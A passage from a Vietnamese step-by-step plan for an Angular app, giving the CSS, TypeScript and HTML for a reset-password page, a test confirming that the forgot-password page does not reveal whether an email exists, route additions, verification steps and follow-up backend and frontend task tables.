  line-height: 1.6;
}

.link {
  border: 0;
  background: transparent;
  font-family: var(--font-body);
  font-size: 13px;
  font-weight: 600;
  color: var(--color-primary-bright);
  cursor: pointer;
  padding: 0;
}

.link:hover {
  text-decoration: underline;
}
```

- [ ] **Step 6: Viết trang Đặt lại mật khẩu — TS**

Tạo `reset-password.ts`:

```ts
import { ChangeDetectionStrategy, Component, computed, inject, signal } from '@angular/core';
import { AbstractControl, FormBuilder, ReactiveFormsModule, ValidationErrors, Validators } from '@angular/forms';
import { ActivatedRoute, Router, RouterLink } from '@angular/router';
import { MatIconModule } from '@angular/material/icon';
import { AuthService } from '@core/services/auth.service';
import { AuthAside } from '@shared/components/auth-aside/auth-aside';

/** Kiểm tra hai ô mật khẩu khớp nhau — gắn ở cấp nhóm, xem `security.ts`. */
function passwordsMatch(group: AbstractControl): ValidationErrors | null {
  const next = group.get('new_password')?.value;
  const confirm = group.get('confirm_password')?.value;
  return next && confirm && next !== confirm ? { mismatch: true } : null;
}

/**
 * AUTH-04 (bước 2) — đặt lại mật khẩu bằng token từ email (API v0.2 mục 2.1).
 *
 * Token đến từ query param `?token=...` trong liên kết email gửi cho khách.
 * Vì sao kiểm tra token rỗng ngay khi mở trang: nếu khách tự gõ URL này mà
 * không có token thì gửi lên cũng chỉ nhận `1006` — báo trước sẽ rõ ràng hơn.
 */
@Component({
  selector: 'app-reset-password',
  changeDetection: ChangeDetectionStrategy.OnPush,
  imports: [ReactiveFormsModule, RouterLink, MatIconModule, AuthAside],
  templateUrl: './reset-password.html',
  styleUrl: './reset-password.css',
})
export class ResetPassword {
  private readonly fb = inject(FormBuilder);
  private readonly authService = inject(AuthService);
  private readonly route = inject(ActivatedRoute);
  private readonly router = inject(Router);

  protected readonly loading = signal(false);
  protected readonly showPassword = signal(false);
  protected readonly errorMessage = signal('');
  protected readonly token = signal('');

  protected readonly form = this.fb.nonNullable.group(
    {
      new_password: ['', [Validators.required, Validators.minLength(8)]],
      confirm_password: ['', [Validators.required]],
    },
    { validators: passwordsMatch },
  );

  protected readonly mismatch = computed(() => this.form.hasError('mismatch'));

  constructor() {
    const token = this.route.snapshot.queryParamMap.get('token') ?? '';
    this.token.set(token);
    if (!token) {
      this.errorMessage.set(
        'Liên kết không hợp lệ — thiếu mã đặt lại. Hãy yêu cầu gửi lại email.',
      );
    }
  }

  protected toggleShow(): void {
    this.showPassword.set(!this.showPassword());
  }

  protected showError(control: 'new_password' | 'confirm_password'): boolean {
    const c = this.form.controls[control];
    return c.touched && c.invalid;
  }

  protected submit(): void {
    if (!this.token()) {
      return;
    }
    if (this.form.invalid) {
      this.form.markAllAsTouched();
      return;
    }

    this.loading.set(true);
    this.errorMessage.set('');
    const { new_password } = this.form.getRawValue();

    this.authService.confirmPasswordReset(this.token(), new_password).subscribe({
      next: () => {
        this.loading.set(false);
        // Đặt lại xong thì bắt đăng nhập lại — không tự đăng nhập, vì token
        // đặt lại không phải token phiên.
        this.router.navigate(['/login']);
      },
      error: (err: Error) => {
        this.loading.set(false);
        this.errorMessage.set(err.message);
      },
    });
  }
}
```

- [ ] **Step 7: Viết trang Đặt lại mật khẩu — HTML**

Tạo `reset-password.html`:

```html
<div class="auth">
  <app-auth-aside />

  <div class="auth__form">
    <div class="auth__box">
      <h1>Đặt lại mật khẩu</h1>
      <p class="sub">Chọn mật khẩu mới cho tài khoản của bạn.</p>

      @if (errorMessage(); as msg) {
        <p class="err" role="alert">{{ msg }}</p>
      }

      <form [formGroup]="form" (ngSubmit)="submit()">
        <div class="field" [class.field--error]="showError('new_password')">
          <label for="rp-new">Mật khẩu mới</label>
          <div class="pw">
            <input
              id="rp-new"
              [type]="showPassword() ? 'text' : 'password'"
              formControlName="new_password"
              autocomplete="new-password"
            />
            <button
              class="pw__toggle"
              type="button"
              [attr.aria-label]="showPassword() ? 'Ẩn mật khẩu' : 'Hiện mật khẩu'"
              (click)="toggleShow()"
            >
              <mat-icon>{{ showPassword() ? 'visibility_off' : 'visibility' }}</mat-icon>
            </button>
          </div>
          @if (showError('new_password')) {
            <span class="field__err">Mật khẩu phải có ít nhất 8 ký tự</span>
          }
        </div>

        <div class="field" [class.field--error]="showError('confirm_password') || mismatch()">
          <label for="rp-conf">Nhập lại mật khẩu</label>
          <input
            id="rp-conf"
            [type]="showPassword() ? 'text' : 'password'"
            formControlName="confirm_password"
            autocomplete="new-password"
          />
          @if (mismatch()) {
            <span class="field__err">Mật khẩu xác nhận không khớp</span>
          }
        </div>

        <button class="submit" type="submit" [disabled]="loading() || !token()">
          {{ loading() ? 'Đang lưu…' : 'Đặt lại mật khẩu' }}
        </button>
      </form>

      <a class="back" routerLink="/forgot-password">Yêu cầu liên kết mới</a>
    </div>
  </div>
</div>
```

- [ ] **Step 8: Viết trang Đặt lại mật khẩu — CSS**

Tạo `reset-password.css`. Sao chép từ `forgot-password.css` rồi thêm:

```css
.err {
  margin: 0 0 16px;
  padding: 10px 13px;
  border-radius: var(--radius);
  background: var(--color-danger-soft);
  color: var(--color-on-danger-soft);
  font-size: 12.5px;
  line-height: 1.55;
}

.pw {
  position: relative;
  display: flex;
  align-items: center;
}

.pw input {
  padding-right: 44px;
}

.pw__toggle {
  position: absolute;
  right: 6px;
  border: 0;
  background: transparent;
  color: var(--color-ink-subtle);
  cursor: pointer;
  display: inline-flex;
  align-items: center;
  padding: 6px;
}

.pw__toggle:hover {
  color: var(--color-primary);
}

.pw__toggle mat-icon {
  font-size: 19px;
  width: 19px;
  height: 19px;
}
```

- [ ] **Step 9: Viết test**

Tạo `forgot-password.spec.ts`:

```ts
import { provideHttpClient, withInterceptors } from '@angular/common/http';
import { TestBed } from '@angular/core/testing';
import { provideRouter } from '@angular/router';
import { MockRegistry } from '@core/mock/mock-registry';
import { mockInterceptor } from '@core/mock/mock.interceptor';
import { ForgotPassword } from '@features/client/pages/forgot-password/forgot-password';

describe('ForgotPassword — không tiết lộ email có tồn tại', () => {
  beforeEach(async () => {
    await TestBed.configureTestingModule({
      imports: [ForgotPassword],
      providers: [
        provideRouter([]),
        MockRegistry,
        provideHttpClient(withInterceptors([mockInterceptor])),
      ],
    }).compileComponents();
  });

  it('email KHÔNG tồn tại vẫn hiện thông báo trung tính, không báo lỗi', async () => {
    const fixture = TestBed.createComponent(ForgotPassword);
    fixture.detectChanges();

    const cmp = fixture.componentInstance as unknown as {
      form: { setValue: (v: unknown) => void };
      submit: () => void;
    };
    cmp.form.setValue({ email: 'khong-ton-tai@example.com' });
    cmp.submit();
    await new Promise((r) => setTimeout(r, 600));
    fixture.detectChanges();

    const text = (fixture.nativeElement as HTMLElement).textContent ?? '';
    expect(text).toContain('Kiểm tra hộp thư');
    // Không được lộ rằng email không tồn tại.
    expect(text).not.toContain('không tồn tại');
  });
});
```

- [ ] **Step 10: Thêm route**

Trong `src/app/app.routes.ts`, thêm vào khối `children` của layout khách (cạnh `login`/`register`):

```ts
      {
        path: 'forgot-password',
        loadComponent: () =>
          import('@features/client/pages/forgot-password/forgot-password').then(
            (m) => m.ForgotPassword,
          ),
        data: { title: 'Quên mật khẩu' },
      },
      {
        path: 'reset-password',
        loadComponent: () =>
          import('@features/client/pages/reset-password/reset-password').then(
            (m) => m.ResetPassword,
          ),
        data: { title: 'Đặt lại mật khẩu' },
      },
```

- [ ] **Step 11: Chạy test + build + kiểm chứng**

Run: `npx ng test --watch=false` → PASS.
Run: `npx ng build` → xanh.

Trên trình duyệt:
- `/forgot-password`: nhập một email bất kỳ → hiện "Kiểm tra hộp thư" kèm chính email đó. Nhập email không tồn tại cũng ra **cùng** thông báo.
- `/reset-password?token=mock-reset-token`: đổi mật khẩu thành công → chuyển về `/login`; đăng nhập bằng mật khẩu mới được.
- `/reset-password?token=sai`: hiện lỗi *"Liên kết đặt lại mật khẩu không hợp lệ hoặc đã hết hạn"*.
- `/reset-password` (không có token): hiện cảnh báo thiếu mã ngay khi mở, nút gửi bị khoá.
- 375px: form một cột, không tràn ngang.

- [ ] **Step 12: Commit**

```bash
git add src/app/features/client/pages/forgot-password/ \
  src/app/features/client/pages/reset-password/ \
  src/app/core/services/auth.service.ts src/app/core/mock/mock-registry.ts \
  src/app/app.routes.ts
git commit -m "feat(auth): trang quên mật khẩu và đặt lại mật khẩu"
```

---

## Sau khi xong 6 cụm

### Việc phía Backend cần (báo Bình)

| # | Việc | Tài liệu |
|---|---|---|
| 1 | Thêm 5 cột ảnh/mô tả/nhãn qua migration `V5` | `be/docs/De_xuat_bo_sung_DB_v0.5_truong_anh.md` |
| 2 | **Chốt `permissions.module`** — API v0.2 mục 2.4 trả và lọc theo `module`, nhưng DB v0.4 bảng `permissions` chỉ có `id`, `permission_key`, `description`. Cần hoặc thêm cột, hoặc suy `module` từ tiền tố `permission_key` | câu hỏi mới, xem Cụm 1 |
| 3 | **Chốt `users.roles` (mảng) hay `users.role_id` (một role)** — DB v0.4 dùng `role_id NOT NULL`, API v0.2 ghi `roles: ["STAFF"]` | câu hỏi mới, xem Cụm 2 |
| 4 | Endpoint upload ảnh cho master data + avatar (hiện chỉ Cloudinary cho avatar, chưa nối) | — |
| 5 | Chốt định dạng `content` News (đã xác nhận là HTML → FE đã sanitize) | — |

### Việc kỹ thuật nên làm khi rảnh

| # | Việc | Lý do |
|---|---|---|
| 1 | Thêm test cho `CrudPage` | Hiện chỉ có test cho mock layer, màn Airlines, và các màn mới |
| 2 | Sửa cảnh báo budget CSS | Nhiều component vượt 4 kB — có thể nâng `maximumWarning` lên 8 kB trong `angular.json` thay vì tách file |
| 3 | Hỗ trợ cột dạng liên kết trong `CrudColumn` | ✅ đã làm ở Cụm 3, Step 9 |
| 4 | Màn "Ví của tôi" (`/account/wallet`) | Chưa quyết định — `WALLET_READ_SELF` thuộc Phase 3 (API v0.2 mục 3) |
| 5 | Nối endpoint upload avatar thật | `POST /profile/avatar` (multipart) đã có trong API; FE đang dùng data URL |
| 6 | Màn Hồ sơ cá nhân cho ADMIN (`/admin/profile`) | Đang là `coming-soon`; có thể dùng lại `AccountProfile` với layout admin |
